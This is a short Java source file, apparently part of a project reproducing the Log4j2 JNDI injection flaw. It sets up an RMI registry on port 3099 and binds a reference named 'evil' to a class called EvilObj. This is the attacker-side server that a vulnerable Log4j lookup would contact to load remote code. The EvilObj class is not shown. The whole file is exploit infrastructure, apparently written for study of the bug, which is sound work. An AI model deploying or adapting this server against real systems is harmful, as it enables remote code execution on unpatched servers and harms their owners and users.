/*
 * Copyright (c) 2001-2022 GuaHao.com Corporation Limited. All rights reserved.
 * This software is the confidential and proprietary information of GuaHao Company.
 * ("Confidential Information").
 * You shall not disclose such Confidential Information and shall use it only
 * in accordance with the terms of the license agreement you entered into with GuaHao.com.
 */
package com.bloom.log4j2bug.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import javax.naming.Reference;

/**
 * TODO
 *
 * @author taosy
 * @version V1.0
 * @since 2022-01-05 11:54
 */
public class RMIServer {

    public static void main(String[] args) {
        try {

            System.out.println(System.getSecurityManager() == null);
            if (System.getSecurityManager() == null) {
                System.setSecurityManager(new SecurityManager());
            }

            LocateRegistry.createRegistry(3099);
            Registry registry = LocateRegistry.getRegistry(3099);

            Reference ref = new Reference("com.bloom.log4j2bug.rmi.EvilObj", "com.bloom.log4j2bug.rmi.EvilObj", null);
            ReferenceWrapper remote = new ReferenceWrapper(ref);

            registry.rebind("evil", remote);
            System.out.println("启动 RMI 服务端");
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
